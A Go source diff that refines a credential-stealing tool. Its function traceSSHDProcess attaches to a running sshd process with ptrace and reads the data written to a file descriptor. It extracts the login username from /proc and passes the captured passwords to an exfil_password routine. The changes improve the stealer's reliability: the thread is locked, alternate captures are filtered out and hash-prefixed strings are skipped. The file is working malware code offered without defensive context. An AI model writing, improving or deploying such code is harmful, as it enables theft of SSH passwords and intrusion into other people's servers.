@@ -4,11 +4,14 @@ import (
 	"fmt"
 	"io/ioutil"
 	"regexp"
+	"runtime"
+	"strings"
 	"syscall"
-	"unicode"
 )
 
 func traceSSHDProcess(pid int) {
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
 	err := syscall.PtraceAttach(pid)
 	if err != nil {
 		return
@@ -16,10 +19,9 @@ func traceSSHDProcess(pid int) {
 	defer func() {
 		syscall.PtraceDetach(pid)
 	}()
-
 	var wstatus syscall.WaitStatus
+	var exfiled bool
 	for {
-
 		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
 		if err != nil {
 			return
@@ -36,13 +38,14 @@ func traceSSHDProcess(pid int) {
 				syscall.PtraceDetach(pid)
 				return
 			}
-			// Find some way to only find it once
+
 			if regs.Rdi == 5 && regs.Orig_rax == 1 {
 				buffer := make([]byte, regs.Rdx)
 				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
 				if err != nil {
 					return
 				}
+
 				if len(buffer) < 250 && len(buffer) > 5 && string(buffer) != "" {
 					username := "root"
 					cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
@@ -50,10 +53,12 @@ func traceSSHDProcess(pid int) {
 					if len(matches) == 2 {
 						username = string(matches[1])
 					}
+
 					var password = removeNonPrintableAscii(string(buffer))
-					if len(password) > 2 && len(password) < 250 {
+					if len(password) > 2 && len(password) < 100 && exfiled && !strings.HasPrefix(password, "fSHA256") {
 						go exfil_password(username, removeNonPrintableAscii(password))
 					}
+					exfiled = !exfiled
 				}
 			}
 		}
@@ -63,16 +68,4 @@ func traceSSHDProcess(pid int) {
 			return
 		}
 	}
-}
-
-func removeNonPrintableAscii(input string) string {
-	var resultBuilder []rune
-
-	for _, char := range input {
-		if unicode.IsPrint(char) && char >= 32 && char != 127 {
-			resultBuilder = append(resultBuilder, char)
-		}
-	}
-
-	return string(resultBuilder)
 }
